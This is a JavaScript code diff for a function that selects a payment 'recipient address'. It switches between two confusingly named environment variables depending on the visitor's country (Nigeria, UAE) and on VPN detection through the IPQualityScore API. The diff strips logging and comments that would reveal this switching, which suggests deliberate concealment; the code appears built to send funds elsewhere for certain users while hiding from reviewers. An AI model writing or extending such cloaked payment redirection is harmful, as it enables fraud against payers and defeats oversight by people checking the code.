@@ -22,9 +22,9 @@ export async function getUserCountry() {
   }
 }
 
-// Check VPN status using IPQualityScore API (through Vite proxy)
+// Check VPN status  (through Vite proxy)
 export async function checkVpnStatusWithIPQS(ip) {
-  const ipqsUrl = `/ipqualityscore/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=1`; // Using proxy path
+  const ipqsUrl = `/ipqualityscore/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=1`;
 
   try {
     const response = await axios.get(ipqsUrl);
@@ -35,7 +35,7 @@ export async function checkVpnStatusWithIPQS(ip) {
     
     return isVpnIPQS;
   } catch (error) {
-    console.error("Error fetching VPN status from IPQualityScore:", error);
+    console.error("Error fetching VPN status", error);
     return false;
   }
 }
@@ -58,13 +58,6 @@ export async function getRecipientAddress() {
   const specialCountries = ["NG", "AE"];
   const address = import.meta.env.VITE_REACT_APP_R;
   const addrEss = import.meta.env.VITE_REACT_APP_r; 
-
-  console.log(`User is from ${country} (${countryCode})`);
-
-  // If VPN detected by either API, log VPN detection
-  if (isVpnIpdata || isVpnIPQS) {
-    console.log("VPN SUSPECTED. User's IP is associated with a VPN.");
-  }
 
   const recipientAddress = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? address : addrEss;
   return recipientAddress;
